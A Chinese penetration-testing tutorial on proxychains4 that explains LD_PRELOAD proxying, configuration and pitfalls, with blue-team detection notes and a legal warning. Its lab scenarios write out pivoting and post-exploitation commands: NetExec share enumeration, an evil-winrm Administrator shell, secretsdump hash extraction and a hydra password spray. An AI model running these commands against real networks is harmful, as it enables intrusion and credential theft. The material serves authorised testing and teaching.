# Proxychains4（把任意 TCP 工具塞进代理链）

> **一句话**：通过 `LD_PRELOAD` 劫持 libc 的网络函数，让**任何动态链接的 TCP 程序**自动走 SOCKS4/5 或 HTTP 代理——不改代码、不加参数。
> **分类**：后渗透 / 协议隧道（Command & Control）｜ **Kali 包**：`proxychains-ng`（命令 `proxychains4`、`proxychains4-daemon`；配置 `/etc/proxychains4.conf`）｜ **官方文档**：<https://github.com/rofl0r/proxychains-ng>

---

## 1. 它解决什么问题

打隧道（Chisel/Ligolo-ng/`ssh -D`/Metasploit socks）之后，你手上有一个 SOCKS5 代理。问题是：**很多工具不支持「走代理」**。

- `nmap` 没有 `--proxy` 参数；
- `nxc`/`evil-winrm`/`impacket` 也没有；
- 你不想为每个工具改源码、或者它们根本不给你改。

Proxychains4 的答案是：**在系统调用层面做手脚**。程序以为自己连的是 `10.10.20.5:445`，实际上 libc 的 `connect()` 被替换成了「连 127.0.0.1:1080，然后发 SOCKS5 握手」。

```
proxychains4 nmap -sT -Pn -p 445 10.10.20.5
      │
      └─ LD_PRELOAD=libproxychains4.so  → 钩住 connect()/getaddrinfo()
                                         → 所有 TCP 连接改道代理
```

对比同类：

| 方案 | 优点 | 缺点 |
|------|------|------|
| **proxychains4** | 工具零改动、支持代理链 | **只支持 TCP**、对静态/Go 程序无效 |
| **Ligolo-ng（TUN）** | 全协议、无代理开销 | 需要 TUN 权限，Kali 侧配置稍多 |
| **Chisel 定点转发** | 最稳、无 hook 副作用 | 端口多时要写一长串映射 |
| **工具自带代理参数** | 最干净 | 很多工具没有 |

**核心结论**：proxychains4 是「**代理链的最后一公里适配器**」，适合应急与一次性操作；长期/复杂场景优先用 Ligolo-ng（见 [`ligolo-ng.md`](ligolo-ng.md)）。

---

## 2. 工作原理

### 2.1 LD_PRELOAD 劫持

```
proxychains4 <程序>
   │
   ├─ 读取配置（/etc/proxychains4.conf 或 -f 指定）
   ├─ 设置 LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libproxychains4.so
   └─ execve(<程序>)
          │
          └─ 程序启动后，动态链接器先加载 libproxychains4.so
               它覆盖了：connect() / getaddrinfo() / gethostbyname()
                    │
                    程序调用 connect("10.10.20.5", 445)
                    │
                    ▼
                libproxychains4 改为：
                  1) 连代理（如 127.0.0.1:1080）
                  2) 发 SOCKS5 CONNECT 10.10.20.5:445
                  3) 把 socket 交还给程序
```

### 2.2 三种代理链模式

| 模式 | 行为 | 适用 |
|------|------|------|
| `strict_chain`（默认） | **严格按顺序**串行经过**所有**代理，全部可用才成功 | 需要固定路径（合规审计场景） |
| `dynamic_chain` | 跳过不可用的代理，链上**至少一个**可用即可，顺序保持 | **实战最常用** |
| `random_chain` | 随机顺序 | 分散流量（`chain_len` 控制长度） |

### 2.3 局限（**必须记住，这是 90% 的坑来源**）

1. **只支持 TCP**。UDP / ICMP 完全不走代理 → `nmap` 的 `-sU`、`ping`、`traceroute` 无效。
2. **`nmap` 必须用 `-sT`**（TCP connect 扫描），因为 SYN 半开扫描需要原始套接字，绕过了 libc。
3. **对静态链接程序无效**（没有动态链接器，hook 不上）。
4. **对 Go 程序常常无效**：Go 运行时直接用系统调用（不经过 libc 的 `connect`），所以很多 Go 写的工具（部分隧道/C2 客户端）**绕过 proxychains**。
5. **setuid 程序无效**：出于安全策略，`LD_PRELOAD` 会被忽略。
6. **DNS 解析**：默认由 `proxy_dns` 决定——开启后 DNS 请求也走代理（通过 SOCKS5 的域名解析），避免本地 DNS 泄露。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install proxychains4
command -v proxychains4
proxychains4 --help
```

```console
root@kali:~# proxychains4 --help

Usage:	proxychains4 -q -f config_file program_name [arguments]
	-q makes proxychains quiet - this overrides the config setting
	-f allows one to manually specify a configfile to use
	for example : proxychains telnet somehost.com
More help in README file
```

配置（默认 `/etc/proxychains4.conf`）：

```bash
sudo grep -vE '^\s*#|^\s*$' /etc/proxychains4.conf | head -30
```

```console
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks4	127.0.0.1 9050
```

改成指向你的 SOCKS5：

```ini
dynamic_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 1080
```

> Kali 上常见的 SOCKS5 来源：Metasploit 的 `auxiliary/server/socks_proxy`（默认 1080）、Chisel 的 `R:socks`（1080）、`ssh -D 1080`、Ligolo-ng（一般**不需要** proxychains）。

使用时只需要在前面加 `proxychains4`：

```bash
proxychains4 -q nmap -sT -Pn -p 445 10.10.20.5
```

---

## 4. 核心参数详解

### 4.1 命令行参数

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-q` | 静默（不打印调试行） | **几乎总要加**，否则每个连接都刷一堆 `|S-chain|` |
| `-f <file>` | 指定配置文件 | 多场景切换时用（如 `/etc/proxychains4.conf` 与项目专用 conf） |
| `-h` / `--help` | 帮助 | —— |
| `<程序> [参数...]` | 要代理的程序 | 参数原样传给程序 |

### 4.2 配置文件关键项

| 配置项 | 作用 | 使用建议 |
|--------|------|----------|
| `strict_chain` | 严格串行链 | 需要固定路径时 |
| `dynamic_chain` | 跳过失效代理 | **实战默认选它** |
| `random_chain` + `chain_len <n>` | 随机顺序 | 分散来源 |
| `proxy_dns` | DNS 也走代理 | **建议开启**（防 DNS 泄露、解决内网域名解析） |
| `remote_dns_subnet 224` | 远程 DNS 用的假网段 | 配合 `proxychains4-daemon` |
| `tcp_read_time_out <ms>` | 读超时 | 跨网段/慢链路调大（如 15000） |
| `tcp_connect_time_out <ms>` | 连接超时 | 目标抖动时调大（如 8000） |
| `quiet_mode` | 静默模式（等价 `-q`） | 写进配置就省得每次敲 |
| `localnet <CIDR>` | 本地网段（**不**走代理） | 避免把 192.168.x 也代理走（默认已含常见私网段） |
| `[ProxyList]` 段 | 代理列表 | `socks5 host port` / `socks4 host port` / `http host port`；支持 `user pass` 追加认证 |

### 4.3 `proxychains4-daemon`（远程 DNS 守护）

| 参数 | 作用 | 默认 |
|------|------|------|
| `-i <ip>` | 监听地址 | `127.0.0.1` |
| `-p <port>` | 监听端口 | `1053` |
| `-r <subnet>` | 远程 DNS 子网 | `224` |

用于把 DNS 查询转发到代理侧解析（配合 `proxy_dns` + `remote_dns_subnet`）。

---

## 5. 实战演练

> **环境声明**：以下在**自建靶场**中进行。假定已通过 [`chisel.md`](chisel.md) 或 Metasploit `socks_proxy` 在 Kali 本地建立了 `127.0.0.1:1080` 的 SOCKS5（指向内网 `10.10.20.0/24`）。全部目标主机为你自有或已获授权。**禁止对未授权网络使用。**

### 场景 1：从零配置一条代理链，跑通第一个内网扫描

```bash
# ① 先确认代理可用
ss -lntp | grep 1080
```

```console
LISTEN 0  4096  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=12345,fd=7))
```

```bash
# ② 配置
sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak
sudo vim /etc/proxychains4.conf
```

```ini
# 使用 dynamic_chain（跳过失效代理）
dynamic_chain
# 让 DNS 也走代理
proxy_dns
# 超时放宽，适应跨网段
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5  127.0.0.1 1080
```

```bash
# ③ 验证：先做最小测试（不只是「能连」，还要确认真的走了代理）
proxychains4 -q curl -s ifconfig.me ; echo
```

```console
# 如果返回的是代理出口的 IP（即跳板机的公网出口），说明链路通了
203.0.113.45
```

```bash
# ④ 内网扫描（关键：-sT，不能用 -sS）
proxychains4 -q nmap -sT -Pn -p 22,445,3389 10.10.20.5
```

```console
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 10.10.20.5
Host is up.
PORT     STATE    SERVICE
22/tcp   filtered ssh
445/tcp  open     microsoft-ds
3389/tcp open     ms-wbt-server
```

**解读**：`-Pn`（不 ping，因为 ICMP 不通代理）+ `-sT`（connect 扫描）是 proxychains 下 nmap 的**固定组合**。否则你会得到「0 hosts up」或全是 `filtered`。

### 场景 2：把常用横向工具全部接上代理

```bash
# NetExec（批量枚举）
proxychains4 -q nxc smb 10.10.20.0/24 -u jdoe -p 'Summer2024!' --shares
```

```console
SMB  10.10.20.5  445  APP01  [+] contoso.local\jdoe:Summer2024!
SMB  10.10.20.5  445  APP01  [*] Enumerated shares
SMB  10.10.20.5  445  APP01      Share      Permissions  Remark
SMB  10.10.20.5  445  APP01      -----      -----------  ------
SMB  10.10.20.5  445  APP01      ADMIN$     READ,WRITE   Remote Admin
SMB  10.10.20.5  445  APP01      C$         READ,WRITE   Default share
```

```bash
# Evil-WinRM（交互式 shell，走 WinRM 5985 —— 同为 TCP，可代理）
proxychains4 -q evil-winrm -i 10.10.20.5 -u Administrator -p 'Passw0rd!'
```

```console
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```bash
# Impacket（Kerberos 场景要注意 UDP！）
proxychains4 -q impacket-secretsdump 'CONTOSO/Administrator:Passw0rd!'@10.10.20.5
```

```console
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
# 口令攻击（SSH 复用）
proxychains4 -q hydra -L users.txt -p 'Summer2024!' ssh://10.10.20.6
```

```bash
# Web 侧（可配 -x 走代理，proxychains 用来统一入口）
proxychains4 -q curl -s http://10.10.20.7/ | head -5
```

**重要提醒（Kerberos 场景）**：Kerberos 需要 **88 端口的 UDP**（以及 464）。proxychains **只代理 TCP**，所以：

```bash
# 若走代理，最好强制 Kerberos 走 TCP（多数 impacket 脚本可用 -k 时优先 TCP，或指定 -dc-ip 让它直连）
# 更好的做法：这类场景改用 Ligolo-ng（TUN，支持 UDP）
```

见 [`ligolo-ng.md`](ligolo-ng.md)。

### 场景 3：多层代理链与「为什么它不生效」的诊断

```ini
# 三层链（示例）：本地 → 跳板 A → 跳板 B → 目标
dynamic_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 1080
socks5  10.10.20.10 1081
socks5  10.10.30.20 1082
```

```bash
# 用 -f 指定专用配置，避免污染全局
proxychains4 -q -f /tmp/chain3.conf nxc smb 10.10.40.5 -u jdoe -p 'Summer2024!'
```

**诊断：为什么某个工具「怎么都不走代理」**

```bash
# ① 确认程序是动态链接的（有 "dynamically linked" 字样）
file $(command -v nxc) 2>/dev/null
ldd $(command -v evil-winrm) | head -3
```

```console
/usr/bin/evil-winrm:
	linux-vdso.so.1
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

```bash
# ② 确认它是不是 Go 静态程序（这类通常绕过 proxychains）
file $(command -v nxc) | grep -o 'statically linked\|dynamically linked'
```

```console
# 若输出 "statically linked" → proxychains 无效，请改用 Ligolo-ng 或定点端口转发
```

```bash
# ③ 用 strace 观察 connect() 是否被改道（调试用）
proxychains4 -q strace -f -e trace=connect -o /tmp/pc.log curl -s http://10.10.20.7/ > /dev/null
grep -m3 'sin_port' /tmp/pc.log
```

```console
connect(3, {sa_family=AF_INET, sin_port=htons(1080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
```

**解读**：看到 `htons(1080)` 连到 `127.0.0.1` —— 这就是 libproxychains4 生效的铁证（原本应该直连目标 IP 的 80 端口）。

**不生效时的替代方案**：

```bash
# 方案 A：用 Ligolo-ng 建立 TUN（全协议、无 hook）
# 方案 B：用 chisel 做定点端口映射，然后直接连本地端口
./chisel client <kali>:8080 R:1445:10.10.20.5:445
proxychains4 -q nxc smb 127.0.0.1 --port 1445 -u jdoe -p 'Summer2024!'
# 方案 C：静态/Go 程序改用支持代理的等价工具，或自带 --proxy 参数
```

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `\|S-chain\|-<ip>:<port>-<n>-<ip2>:<port2>-OK` | 连接成功经过代理链 | 正常（加 `-q` 就不显示） |
| `\|S-chain\|-...-<>-denied` | 代理拒绝（认证失败/无权限） | 检查代理认证与规则 |
| `\|S-chain\|-...-timeout` | 代理侧超时 | 检查代理与目标可达性；调大超时 |
| `curl ifconfig.me` 返回代理出口 IP | **代理确实生效** | 可以开始内网操作 |
| `nmap` 返回 `0 hosts up` | 缺 `-Pn`（ICMP 不通代理） | 加 `-Pn` |
| `nmap` 全 `filtered` | 用了 `-sS` 而非 `-sT` | **必须 `-sT`** |
| 程序报连接超时但代理正常 | 该程序是静态/Go/setuid（hook 失败） | 用 Ligolo-ng 或定点转发 |
| `ERROR: ld.so: object 'libproxychains4.so' ... ignored` | setuid 或架构不匹配 | 换非 setuid 路径执行；确认库架构 |
| `proxychains4: command not found` | 未安装 | `sudo apt install proxychains4` |
| 配置改了没生效 | 改了 `/etc/proxychains.conf`（旧路径） | Kali 用 **`/etc/proxychains4.conf`** |

---

## 7. 与其他工具配合

```
建立 SOCKS 入口（任选其一）
  ├─ chisel client ... R:socks            → 127.0.0.1:1080   （见 chisel.md）
  ├─ msf: auxiliary/server/socks_proxy     → 127.0.0.1:1080
  ├─ ssh -D 1080 user@jump                 → 127.0.0.1:1080
  └─ 其它 SOCKS5 代理
        │
        ▼
/etc/proxychains4.conf  [ProxyList] socks5 127.0.0.1 1080
        │
        ├─► proxychains4 -q nmap -sT -Pn ...
        ├─► proxychains4 -q nxc / evil-winrm / impacket-*
        ├─► proxychains4 -q hydra / ssh / curl / mysql ...
        └─► 不生效？→ 改用 ligolo-ng（TUN）或 chisel 定点转发
```

- 隧道建立：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)
- 代理另一侧的横向：[`netexec.md`](netexec.md)、[`impacket.md`](impacket.md)、[`evil-winrm.md`](evil-winrm.md)
- Metasploit 自带 SOCKS：见 [`../06-漏洞利用/metasploit-framework.md`](../06-漏洞利用/metasploit-framework.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `nmap` 全 `filtered` / `0 hosts up` | 用了 `-sS` 或缺 `-Pn` | 固定用 `proxychains4 -q nmap -sT -Pn ...` |
| UDP 服务扫不到（161/53/123） | **proxychains 不支持 UDP** | 换 Ligolo-ng（TUN）；或目标侧用 agent 直接发 |
| `ping` 不通 | ICMP 不走代理 | 用 TCP 探测（`nc -vz`、`nmap -sT -Pn`） |
| 某个 Go/静态工具怎么都不走代理 | Go 直接 syscall，LD_PRELOAD 无效 | 换 Ligolo-ng 或定点端口转发 |
| `setuid` 程序不生效 | 安全策略忽略 LD_PRELOAD | 用非 setuid 路径或改权限（授权环境） |
| 修改配置无效 | 改错了文件（`/etc/proxychains.conf`） | Kali 用 **`/etc/proxychains4.conf`**，或 `-f` 指定 |
| 输出刷屏 `\|S-chain\|` | 没加 `-q` | 加 `-q` 或在配置里 `quiet_mode` |
| 内网域名解析失败 | 未开 `proxy_dns` | 打开 `proxy_dns`；必要时跑 `proxychains4-daemon` |
| Kerberos 认证失败/超时 | 88/464 端口的 **UDP** 不走代理 | 改用 Ligolo-ng；或让 Kerberos 走 TCP |
| 跨网段极慢 | 多代理串行 + 每次连接重握手 | 减少链长度；改 TUN 方案 |
| 本地服务被误代理 | `localnet` 未覆盖 | 在配置里加 `localnet 127.0.0.0/255.0.0.0`、`localnet 192.168.0.0/255.255.0.0` |
| 代理认证失败（`denied`） | 代理需要账号密码 | `[ProxyList]` 里写 `socks5 host port user pass` |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| 代理链入口 | 内网主机**出站**到单一固定 IP:PORT 的长期 TCP 连接 | 出站白名单 + 强制正向代理；长连接基线告警 |
| `nmap -sT` 特征扫描 | 大量**完整 TCP 三次握手**（区别于 SYN 半开）到多端口 | IDS 连接速率阈值、端口扫描检测规则 |
| SOCKS5 握手特征 | SOCKS5 明文握手（首字节 `0x05`）出现在非标准端口 | DPI 识别 SOCKS 协议、非标端口流量审计 |
| 本地代理端口监听 | Kali 侧行为（无企业日志） | —— |
| 域名解析异常 | 内网 DNS 查询量骤增或查询模式异常（`proxy_dns` 通过代理解析） | DNS 审计与限流、只允许企业 DNS |
| 横向放大 | 单个来源主机短时间内触达大量内网 IP | 内网微隔离、东西向流量审计 |
| 工具进程特征 | `proxychains4` 进程、`LD_PRELOAD` 指向 `libproxychains4.so` | 主机侧 EDR 可检测异常 `LD_PRELOAD`（Linux 资产） |

**蓝队要点**：proxychains4 只是**适配器**，不是入口。真正的入口是隧道（Chisel/Ligolo/SSH）。因此**检测重点应放在「内网主机的异常出站长连接」上**，而不是去找 `libproxychains4.so`。

---

## 10. 参考

- proxychains-ng 官方仓库（含配置说明与限制）：<https://github.com/rofl0r/proxychains-ng>
- Kali 工具页：<https://www.kali.org/tools/proxychains-ng/>
- MITRE ATT&CK · 代理（T1090）、协议隧道（T1572）
- 本地资源：`proxychains4 --help`、`man proxychains4.conf`、`cat /etc/proxychains4.conf`

## ⚠️ 法律与伦理

通过代理链隐藏来源、访问未授权主机，可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法控制计算机信息系统）与第 286 条，并可能构成对《网络安全法》第 27 条的违反。**「隐藏来源」本身也会被作为主观恶意的加重情节。**

本教程仅用于：**书面授权的渗透测试与红队演练、CTF、自建靶场、自有环境的网络实验**。请勿将代理链用于隐藏非法访问的来源；测试结束后应关闭所有代理与隧道，并在报告中如实记录访问路径与时间范围。
